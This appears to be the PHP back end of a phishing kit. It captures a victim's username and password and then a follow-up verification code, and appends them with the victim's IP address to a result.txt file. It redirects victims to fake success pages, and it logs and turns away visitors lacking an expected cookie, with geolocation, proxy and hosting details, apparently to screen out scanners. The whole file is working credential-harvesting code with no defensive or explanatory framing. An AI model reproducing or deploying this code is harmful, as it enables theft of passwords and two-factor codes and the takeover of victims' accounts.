<?php
session_start();
require 'get_ip_details.php';

$ALL_REPORT_LOGS = fopen("./ALL_REPORT_LOGS/REPORT_CAPCHA.txt", "a") or die("Unable to open file!");

if (isset($_GET['task'])) {
    $status = $_GET['task'];
}else{
    $status = 'UNKNOWN';
}

if (isset($_COOKIE['_csrf']) && !empty($_COOKIE['_csrf'])) {
    
    $csrfFromCookie = $_COOKIE['_csrf']; 
    if ($_GET['task'] == 'form_login_user_pass') { 
        $_SESSION['usr'] = trim($_POST['usr']);
        $_SESSION['pwd'] = trim($_POST['pwd']);
        $pwd = $_SESSION['pwd'];
        $usr = $_SESSION['usr'];
        $fw2 = fopen("result.txt","a");
        $data= "IP: $ip | USER: $usr | PASS: $pwd \n";
        fputs($fw2,$data);
        fclose($fw2);
        header('Location: ./formnoticesenddata.php?STATUS=SAVE_FORM');
      }


    if ($_GET['task'] == 'form_login_CODE') { 
        $_SESSION['code'] = trim($_POST['code']);
        $code = $_SESSION['code'];

        $pwd = $_SESSION['pwd'];
        $usr = $_SESSION['usr'];


        $fw2 = fopen("result.txt","a");


        $data= "IP: $ip | USER: $usr | PASS: $pwd | COD: [ $code ] \n";
        fputs($fw2,$data);
        fclose($fw2);
         header('Location: ./succescheckyouraccount.php');
      } 


}else{
    $txt = $ip . " | _csrf NOT EXIST ".$status." | " . $datex_ .  " | "  .   $country . " | "  .$region. " | "  . $city . " | "  .  $isp  . " | "  . $proxy . " | "  . $hosting . " | "  . $org .  " | ". $as ."\n";
		fwrite($ALL_REPORT_LOGS, $txt);
		fclose($ALL_REPORT_LOGS);
		echo  false;
        header("Location: ./");
        exit();
}




?>
